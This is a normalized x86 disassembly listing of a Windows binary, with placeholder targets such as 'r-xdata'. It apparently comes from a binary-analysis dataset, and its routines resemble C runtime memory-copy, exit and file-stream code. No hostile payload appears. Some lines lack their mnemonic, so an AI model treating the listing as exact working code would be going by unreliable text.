palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + r-xdata ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_416e51
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4106eb
mov edx eax
mov eax rw-data
pop ecx
xchg [ eax ] edx
mov eax [ rw-data ]
mov ecx eax
and ecx 0x1f
xor eax edx
ror eax cl
pop ebp
retn
sub_416ea4
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_416f55
push 0xc
push r--data
call sub_448c20
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push 0x2
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
call sub_4170b8
test al al
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41705f
test esi esi
jne r-xdata
xor eax eax
inc eax
mov ecx rw-data
xchg [ ecx ] eax
mov [ ebp - 0x4 ] 0x1
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
push [ ebp + 0x8 ]
call sub_417117
pop ecx
call sub_448c69
retn
push [ ebp + 0x8 ]
call sub_41706e
cmp edi 0x1
jne r-xdata
mov ebx [ rw-data ]
mov edx ebx
and edx 0x1f
push 0x20
pop ecx
sub ecx edx
xor eax eax
ror eax cl
xor eax ebx
mov ecx [ rw-data ]
cmp ecx eax
je r-xdata
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
xor ebx ecx
xor eax eax
push eax
push eax
push eax
mov ecx edx
ror ebx cl
mov ecx ebx
call [ r--data ]
call ebx
push r--data
push r--data
call sub_42b02d
pop ecx
pop ecx
test esi esi
jne r-xdata
push r--data
push r--data
call sub_42b02d
pop ecx
pop ecx
call sub_42cf99
pop ecx
mov [ rw-data ] 0x1
sub_41706e
mov edi edi
push ebp
mov ebp esp
call sub_430333
test al al
je r-xdata
push [ ebp + 0x8 ]
call sub_417117
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
mov eax [ fs : 0x30 ]
mov eax [ eax + 0x68 ]
shr eax 0x8
test al 0x1
jne r-xdata
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
sub_4170b8
push 0x0
call [ GetModuleHandleW@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
mov eax 0x5a4d
cmp [ ecx ] ax
jne r-xdata
xor al al
retn
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
jne r-xdata
cmp [ eax + 0x74 ] 0xe
jbe r-xdata
cmp [ eax + 0xe8 ] 0x0
setne al
retn
sub_417117
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push r--data
push 0x0
call [ GetModuleHandleExW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push esi
push r--data
push [ ebp - 0x8 ]
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
push [ ebp - 0x8 ]
call [ FreeLibrary@IAT ]
pop esi
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
sub_4171e0
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
cmp [ rw-data ] eax
jne sub_42d238
push [ ebp + 0x8 ]
call sub_416ea4
pop ecx
mov [ rw-data ] eax
pop ebp
retn
sub_4172d6
mov eax [ rw-data ]
push esi
push 0x3
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_42d49d
push 0x0
mov [ rw-data ] eax
call sub_42d3b1
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov eax esi
mov [ rw-data ] eax
push edi
xor edi edi
mov esi rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_42d49d
push 0x0
mov [ rw-data ] eax
call sub_42d3b1
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov [ esi + 0x10 ] 0xfffffffe
cmp eax 0xfffffffe
je r-xdata
or eax 0xffffffff
pop esi
retn
push 0x0
push 0xfa0
lea eax [ esi + 0x20 ]
push eax
call sub_42fd88
mov eax [ rw-data ]
mov edx edi
sar edx 0x6
mov [ eax + edi * 4 ] esi
mov eax edi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
mov eax [ eax + ecx + 0x18 ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add esi 0x38
inc edi
cmp esi rw-data
jne r-xdata
sub_4173b0
push esi
call sub_4311ab
call sub_431005
xor esi esi
mov eax [ rw-data ]
push [ esi + eax ]
call sub_4312f1
mov eax [ rw-data ]
pop ecx
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
add esi 0x4
cmp esi 0xc
jne r-xdata
push [ rw-data ]
call sub_42d3b1
and [ rw-data ] 0x0
pop ecx
pop esi
retn
sub_4173fa
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
push 0x16
pop eax
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
lea eax [ ecx + 0x4 ]
mov [ edx ] eax
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
mov [ eax ] ecx
xor eax eax
pop ebp
retn
lea eax [ ecx + 0x8 ]
mov [ edx ] eax
sub_417468
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4174f6
add esp 0xc
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
xor eax eax
call sub_430f56
mov eax [ eax ]
jmp r-xdata
pop esi
pop ebp
retn
sub_4174af
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4175b7
add esp 0xc
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
xor eax eax
call sub_430f56
mov eax [ eax ]
jmp r-xdata
pop esi
pop ebp
retn
sub_4174f6
push 0x10
push r--data
call sub_40d270
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
test edi edi
setne al
test eax eax
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor eax eax
cmp [ edi ] al
setne al
test eax eax
je r-xdata
call sub_40d2b6
retn
cmp [ esi ] 0x0
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_431579
pop ecx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
jmp r-xdata
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_431f13
add esp 0x10
mov esi eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4175a0
mov eax esi
call sub_430f56
mov [ eax ] 0x18
jmp r-xdata
xor eax eax
jmp r-xdata
sub_4175b7
push 0x10
push r--data
call sub_40d270
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
test edi edi
setne al
test eax eax
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor eax eax
xor ebx ebx
cmp [ edi ] bx
setne al
test eax eax
je r-xdata
call sub_40d2b6
retn
cmp [ esi ] bx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_431579
pop ecx
cmp [ ebp - 0x1c ] ebx
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
jmp r-xdata
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_431f1e
add esp 0x10
mov esi eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417661
mov eax esi
call sub_430f56
mov [ eax ] 0x18
jmp r-xdata
xor eax eax
jmp r-xdata
sub_417678
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_431f13
add esp 0x10
pop ebp
retn
sub_41769b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_431f1e
add esp 0x10
pop ebp
retn
sub_4176f4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4175b7
add esp 0xc
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
jmp r-xdata
xor esi esi
call sub_430f56
mov esi [ eax ]
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_41775d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4174f6
add esp 0xc
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
jmp r-xdata
xor esi esi
call sub_430f56
mov esi [ eax ]
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_4177c2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
push edi
or edi 0xffffffff
shr eax 0xd
test al 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
push esi
call sub_4315d8
pop ecx
mov eax edi
pop edi
push esi
call sub_4310fe
push esi
mov edi eax
call sub_4312f1
push esi
call sub_4321dd
push eax
call sub_4320bc
add esp 0x10
test eax eax
jns r-xdata
pop esi
pop ebp
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
or edi 0xffffffff
jmp r-xdata
push [ esi + 0x1c ]
call sub_42d3b1
and [ esi + 0x1c ] 0x0
pop ecx
sub_417838
push 0x10
push r--data
call sub_40d270
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x20 ] esi
xor eax eax
test esi esi
setne al
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
shr eax 0xc
push esi
test al 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
and [ ebp - 0x1c ] 0x0
call sub_417440
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4177c2
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4178ae
mov eax esi
call sub_4315d8
pop ecx
jmp r-xdata
call sub_40d2b6
retn
or eax 0xffffffff
jmp r-xdata
sub_4178b8
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_417440
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_4179ad
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4178fd
mov eax esi
call sub_40d2b6
retn 0xc
sub_417909
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_4178b8
mov esp ebp
pop ebp
retn
sub_417943
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax ecx
pop ebp
retn 0x10
sub_417977
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push eax
mov [ esi ] eax
call sub_432ec0
mov [ esi + 0x4 ] al
mov eax esi
pop ecx
pop esi
pop ebp
retn 0x4
sub_4179ad
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_432ec0
mov [ ebp - 0x4 ] al
mov eax [ esi ]
push [ eax ]
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi + 0x8 ]
push [ eax ]
mov eax [ esi + 0x4 ]
push [ eax ]
call sub_417a59
push edi
push [ ebp - 0x4 ]
mov esi eax
call sub_432f75
add esp 0x1c
mov eax esi
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_417a32
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add edx 0xc
mov eax [ edx ]
mov ecx eax
or ecx esi
[ edx ] ecx
jne r-xdata
and eax esi
neg eax
pop esi
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_417a59
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
mov ebx [ ebp + 0x14 ]
test ebx ebx
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
xor edx edx
div esi
cmp edi eax
ja r-xdata
lea eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
test eax 0x4c0
je r-xdata
mov edx 0x1000
mov edx [ ebx + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov eax [ ebx + 0xc ]
test al 0xc0
je r-xdata
imul esi edi
mov [ ebp - 0x4 ] edx
mov edi esi
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi edx
jb r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
movsx eax [ ecx ]
push ebx
push eax
call sub_432e9e
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0xc ]
test al 0xc0
je r-xdata
js r-xdata
sub esi edi
xor edx edx
mov eax esi
div [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebx + 0x18 ]
inc ecx
dec edi
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] edx
test edx edx
jg r-xdata
mov eax edi
test edx edx
je r-xdata
push ebx
call sub_4310fe
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
push 0x10
pop ecx
[ eax ] ecx
cmp edi eax
jae r-xdata
test edi edi
jne r-xdata
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edi
xor edx edx
div [ ebp - 0x4 ]
mov eax edi
sub eax edx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
push eax
push ecx
push [ ebx ]
call sub_40d920
mov eax [ ebp - 0x8 ]
add esp 0xc
sub [ ebx + 0x8 ] eax
sub edi eax
mov ecx [ ebp + 0x8 ]
add [ ebx ] eax
add ecx eax
mov [ ebp + 0x8 ] ecx
jmp r-xdata
mov eax edi
mov [ ebp - 0x8 ] edi
push eax
push ecx
push ebx
call sub_4321dd
pop ecx
push eax
call sub_4327e1
add esp 0xc
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jb r-xdata
mov edx [ ebp - 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx ecx
cmp eax ecx
ja r-xdata
add [ ebp + 0x8 ] edx
sub edi edx
cmp eax ecx
jb r-xdata
mov edx eax
mov ecx [ ebp + 0x8 ]
sub_417bd2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x14 ]
call sub_417909
pop ecx
pop ecx
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov esp ebp
pop ebp
retn
sub_417c2a
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417c95
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417c4d
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417c95
mov eax [ esi + 0x10 ]
and [ esi + 0x458 ] 0x0
and [ esi + 0x45c ] 0x0
or [ esi + 0xaa4 ] 0xffffffff
or [ esi + 0xaa8 ] 0xffffffff
mov [ esi + 0x460 ] eax
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417c95
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
mov esi ecx
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_41c85c
and [ esi + 0x450 ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417cca
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417d35
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417ced
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417d35
mov eax [ esi + 0x10 ]
and [ esi + 0x458 ] 0x0
and [ esi + 0x45c ] 0x0
or [ esi + 0xaa4 ] 0xffffffff
or [ esi + 0xaa8 ] 0xffffffff
mov [ esi + 0x460 ] eax
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417d35
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
mov esi ecx
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_41c8d4
and [ esi + 0x450 ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417d6a
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417dd5
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417d8d
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417dd5
mov eax [ esi + 0x10 ]
and [ esi + 0x458 ] 0x0
and [ esi + 0x45c ] 0x0
or [ esi + 0xaa4 ] 0xffffffff
or [ esi + 0xaa8 ] 0xffffffff
mov [ esi + 0x460 ] eax
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417dd5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
mov esi ecx
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_41c898
and [ esi + 0x450 ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417e0a
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417e75
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417e2d
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417e75
mov eax [ esi + 0x10 ]
and [ esi + 0x458 ] 0x0
and [ esi + 0x45c ] 0x0
or [ esi + 0xaa4 ] 0xffffffff
or [ esi + 0xaa8 ] 0xffffffff
mov [ esi + 0x460 ] eax
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417e75
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
mov esi ecx
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_41c910
and [ esi + 0x450 ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417eaa
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_417440
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41ceba
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417eef
mov eax esi
call sub_40d2b6
retn 0xc
sub_417efb
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_417440
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41d159
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417f40
mov eax esi
call sub_40d2b6
retn 0xc
sub_417f4c
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_417440
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41d290
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417f91
mov eax esi
call sub_40d2b6
retn 0xc
sub_417f9d
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_417440
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41cdf4
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417fe2
mov eax esi
call sub_40d2b6
retn 0xc
sub_417fee
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_417440
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41cfc4
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418033
mov eax esi
call sub_40d2b6
retn 0xc
sub_41803f
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_417440
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41d093
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418084
mov eax esi
call sub_40d2b6
retn 0xc
sub_418090
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_417f9d
mov esp ebp
pop ebp
retn
sub_4180b8
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_417eaa
mov esp ebp
pop ebp
retn
sub_4180e0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_417fee
mov esp ebp
pop ebp
retn
sub_418108
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_41803f
mov esp ebp
pop ebp
retn
sub_418130
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_417efb
mov esp ebp
pop ebp
retn
sub_418158
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_417f4c
mov esp ebp
pop ebp
retn
sub_418180
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
